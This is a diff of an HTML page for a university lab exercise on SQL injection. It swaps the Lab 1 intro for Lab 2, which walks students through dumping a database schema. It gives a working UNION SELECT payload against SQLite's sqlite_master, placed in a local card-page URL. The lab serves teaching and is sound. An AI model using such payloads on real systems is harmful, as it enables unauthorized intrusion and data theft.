@@ -9,18 +9,24 @@
   </head>
   <body class="markdown-body">
       <div style="text-align: left">
-        <h1>⭐ Lab 1 ⭐: Stealing people's data</h1>
-        <p></p>
-      </div>
+        <h1>⭐ Lab 2 ⭐: Stealing System/Database Information</h1>
+        <blockquote>
+            Users' data seem to be not enough for you. You want to keep playing around and get some more Information.
+        </blockquote>
+    </div>
+
       <div style="margin-left: 2%">
-        <h2>🎉 Hi <b><code>COM 325</code></b>!</h2>
-        <p>> Welcome to my lab session 🥳️. My presentation will bring us back to a topic that we already seen in our first class : 💉 <b>SQL Injection</b></p>
-        <p>But today, I would try to bring it to another level. We will be in the role of 😈<b>A Bad Guy</b>😈 trying to do some really bad things.</p>
-      </div>
-        <div style="align-items: center; justify-content: center; margin-top: 4%; text-align: center">
-          <p>👉<b>Click Button to lauch the lab environment: </b></p>
-          <a href="https://gitpod.io/#https://github.com/meobilivang/COM325-SQL-Injection-App/" target="_blank"><img src="https://gitpod.io/button/open-in-gitpod.svg"/></a>
+        <h2>💾 Database Information</h2>
+            <p><b>Current URL</b>: <code>http://127.0.0.1/users/cards/4395</code></p>
+            <p>> You are done with stealing's people personal info. Let's have a check on <b>My Cards</b>. Your cards is displayed here. It is very likely that this page can also be attacked</p>
+            <div style="margin-left: 3%">
+                <p>Try to modify <code>4395</code> to <code>' AND '1' = '2' UNION SELECT sql, name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%</code></p>
+                <p><b>"Bad" URL</b>: <code>http://127.0.0.1/users/cards/' AND '1' = '2' UNION SELECT sql, name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%</code></p>
+            </div>
+        <div style="margin-top: 3%; margin-bot: 2%; text-align: center">
+            <p>🎉 <b>Great job! Now you know about the 'design' of this database. This can be the opening door to further exploits 😈</b></p>
         </div>
+    </div>
 
         <div style="display: flex; align-items: center; justify-content: space-around; margin-top: 4%; text-align: center">
           <a href="lab1.html">👈 Previous 👈</a>
